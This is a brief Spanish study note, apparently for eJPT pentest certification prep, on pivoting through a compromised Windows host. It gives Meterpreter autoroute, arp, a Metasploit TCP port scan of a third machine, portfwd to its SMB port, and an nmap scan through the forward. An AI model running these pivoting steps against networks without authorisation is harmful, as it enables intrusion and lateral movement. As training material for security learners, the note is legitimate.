
------
- Tags #pivoting  #ejpt #meterpreter #windows  
--------

- ### Desde **METERPRETER** 

```meterpreter
run autoroute -s <IpSubRed.0/24> (*dependiendo la mascara)

//Si NO funciona lo hacemos desde shell
```

```shell
shell

arp -a
```

-----
- Escaneo a *3era Maquina*
```metasploit
use auxiliary/scanner/portscan/tcp

//Para que no tarde tanto
set ports 1-1000

//Setear Ip maquina 3
set rhosts <IpTerceraMaquina>

```

- Aun to tenomos conexion como tal
- Para ello hacemos *PortForwarding*

```meterpreter
portfwd add -l 2233(de Mi Maquina) -p 445(3era Maquina) -r <Ip3eraMAquina>

//ver puertos forward
portfwd list
```

- Aqui ya podriamos hacer un escaneo con [[Nmap]]
```kali
nmap -p2233 localhost

//ya podiamos probar un escaneo mas exahustivo
```

